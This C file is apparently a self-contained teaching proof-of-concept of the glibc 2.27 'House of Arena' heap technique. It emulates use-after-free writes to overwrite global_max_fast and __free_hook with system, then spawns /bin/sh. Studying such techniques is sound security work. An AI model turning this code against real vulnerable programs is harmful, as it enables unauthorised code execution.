/*
 * This is a poc of House of Arena
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define off2sz(off) ((off) * 2 - 0x10)

#define MAIN_ARENA          0x3ebc40
#define MAIN_ARENA_DELTA    0x60
#define GLOBAL_MAX_FAST     0x3ed940
#define FREE_HOOK           0x3ed8e8
#define SYSTEM              0x4f440

int main(void)
{
    unsigned long libc_base;
    char* chunk_lis[0x10] = { 0 };

    fprintf(stderr, "This file demonstrates the house of arena attack.\n\n");
    fprintf(stderr, "This poc has been tested on glibc 2.27, it also works with other glibc version before 2.27 as long as you modify the offset accordingly.\n\n");
    fprintf(stderr, "This technique is a combination of unsorted bin attack and fastbin attack. It works when binary has a UAF vulnerability but you find no way to alloc fastbins.\n\n");
    fprintf(stderr, "This technique utilizes some property of fastbin. As we know, the header of a specific-size fastbin will be stored in main_arena's fastbinsY array. In general, the storage is 10. But if we can overwrite global_max_fast to a large value, which stores the maxmium size of fastbin, we can write anywhere a heap address.\n\n");
    fprintf(stderr, "Furthermore, we write a chunk_addr on __free_hook in libc and we free this chunk, overwite its fd pointer to system_addr and alloc specific sz of this chunk, we can finnaly overwite __free_hook to system.\n\n");
    fprintf(stderr, "I named it as house-of-arena because theoretically we can write to anywhere behind main_arena.\n\n");
    fprintf(stderr, "First we alloc three large chunks in which chunk0 is the victim of unsorted_bin attack and chunk0 is the victim of fastbin attack. Chunk2 is used to get shell and avoids consolidation.\n\n");

    //leak libc
    chunk_lis[0] = malloc(0x500);
    //overwrite __free_hook
    chunk_lis[1] = malloc(off2sz(FREE_HOOK-MAIN_ARENA));
    //prevent consolidation as well as preapare for get shell
    chunk_lis[2] = malloc(0x500);

    fprintf(stderr, "Now we write '/bin/sh' to a chunk for later use.\n\n");

    memcpy(chunk_lis[2],"/bin/sh\x00",8);
    fprintf(stderr, "[*] The content of chunk2 is: %s\n",chunk_lis[2]);

    fprintf(stderr, "Now we free chunk0 and it will be put into unsorted bin. The fd of it is main_arena+main_arena_delta so we can leak libc with it.\n\n");
    free(chunk_lis[0]);
    libc_base = *((unsigned long*)chunk_lis[0]) - MAIN_ARENA - MAIN_ARENA_DELTA;
    fprintf(stderr, "[*] libc base => %lx\n",libc_base);

    fprintf(stderr, "Then we emulate a UAF vulnerability to overwite chunk0->bk pointer to global_max_fast-0x10.\n\n");
    //unsorted bin attack
    /*VULNERABILITY*/
    *(unsigned long *)(chunk_lis[0]+8) = libc_base + GLOBAL_MAX_FAST - 0x10;
    /*VULNERABILITY*/
    fprintf(stderr, "[*]The value of global_max_fast before attack: 0x%lx.\n\n",*(unsigned long*)(libc_base+GLOBAL_MAX_FAST));
    //trigger
    chunk_lis[0] = malloc(0x500);
    fprintf(stderr, "[*]The value of global_max_fast after attack: 0x%lx.\n\n",*(unsigned long*)(libc_base+GLOBAL_MAX_FAST));

    //now free_hook 
    fprintf(stderr, "Now we free chunk1 and a chunk_addr will be put into __free_hook.\n\n");
    fprintf(stderr, "[*]The value of __free_hook before attack: 0x%lx.\n\n",*(unsigned long*)(libc_base+FREE_HOOK));
    free(chunk_lis[1]);
    fprintf(stderr, "[*]The value of __free_hook after attack: 0x%lx.\n\n",*(unsigned long*)(libc_base+FREE_HOOK));
    
    fprintf(stderr, "Now we emulate a UAF vulnerability to overwite chunk1->fd pointer to system_addr.\n\n");
    /*VULNERABILITY*/
    *(unsigned long *)(chunk_lis[1]) = libc_base + SYSTEM;
    /*VULNERABILITY*/

    //get shell

    fprintf(stderr, "Next malloc will return chunk1 to user, so its fd will be put into __free_hook, which will overwite __free_hook into system.\n\n");
    malloc(off2sz(FREE_HOOK-MAIN_ARENA));

    fprintf(stderr, "Now if we call free(chunk2), it will finally call system('/bin/sh').\n\n");
    free(chunk_lis[2]);

    return 0;
}
